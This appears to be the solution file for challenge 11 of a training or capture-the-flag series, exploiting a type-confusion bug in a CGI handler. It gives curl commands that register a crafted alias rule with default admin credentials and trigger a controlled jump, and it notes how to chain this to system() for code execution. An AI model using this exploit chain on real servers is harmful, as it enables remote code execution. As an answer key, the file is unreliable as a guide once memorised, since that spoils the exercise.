# Solution — 11 · Type Confusion

**Code**: `handlers/cgi.cpp` → `ExecRule* exec = static_cast<ExecRule*>(rule);`

```bash
# Register an alias rule whose target's first 8 bytes are the address to jump to.
curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=alias&path=/cgi-bin/pwn&target=AAAAAAAA"

# Trigger dispatch: server jumps to 0x4141414141414141.
curl "http://127.0.0.1:8081/cgi-bin/pwn"
```

For real RCE, combine with a leaked libc/aslr base from challenge 03 or 07
and set `target` to the address of `system()`.
